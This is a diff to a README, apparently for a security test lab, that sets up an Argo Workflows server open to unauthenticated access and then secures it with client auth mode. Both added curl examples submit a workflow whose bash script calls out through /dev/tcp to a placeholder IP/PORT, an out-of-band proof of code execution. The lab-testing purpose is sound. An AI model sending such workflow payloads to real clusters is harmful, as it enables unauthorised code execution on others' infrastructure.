@@ -21,3 +21,29 @@ kubectl create rolebinding argo-default-admin --clusterrole=admin --serviceaccou
 ```bash
 kubectl -n argo port-forward deployment/argo-server 2746:2746
 ```
+## Validate with OOB
+Replace `IP/PORT` with your IP and Port.
+```bash
+curl 'https://127.0.0.1:2746/api/v1/workflows/default' \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"workflow":{"apiVersion":"argoproj.io/v1alpha1","kind":"Workflow","metadata":{"name":"","generateName":"scripts-"},"spec":{"destination":{"name":"","namespace":"","server":""},"source":{"path":"","repoURL":"","targetRevision":"HEAD"},"project":"","entrypoint":"aaaaaa","templates":[{"name":"aaaaaa","script":{"image":"ubuntu:22.04","command":["bash"],"source":"echo \"HEAD / HTTP/1.0\" >/dev/tcp/IP/PORT\n"}}]}}}' \
+  --insecure
+```
+# secure instance
+after setting up a vulnerable version, change the authentication mode to client.
+## change authentication
+```bash
+kubectl patch deployment argo-server --namespace argo  --type='json' -p='[{"op": "replace", "path": "/spec/template/spec/containers/0/args", "value": ["server","--auth-mode=client"]}]'
+```
+## Expose the UI to localhost
+```bash
+kubectl -n argo port-forward deployment/argo-server 2746:2746
+```
+## Check that authentication is enabled
+```bash
+curl 'https://127.0.0.1:2746/api/v1/workflows/default' \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"workflow":{"apiVersion":"argoproj.io/v1alpha1","kind":"Workflow","metadata":{"name":"","generateName":"scripts-"},"spec":{"destination":{"name":"","namespace":"","server":""},"source":{"path":"","repoURL":"","targetRevision":"HEAD"},"project":"","entrypoint":"aaaaaa","templates":[{"name":"aaaaaa","script":{"image":"ubuntu:22.04","command":["bash"],"source":"echo \"HEAD / HTTP/1.0\" >/dev/tcp/IP/PORT\n"}}]}}}' \
+  --insecure
+```
+it will response with `{"code":16,"message":"token not valid. see https://argo-workflows.readthedocs.io/en/release-3.5/faq/"}` which prove us that there is a authentication layer.
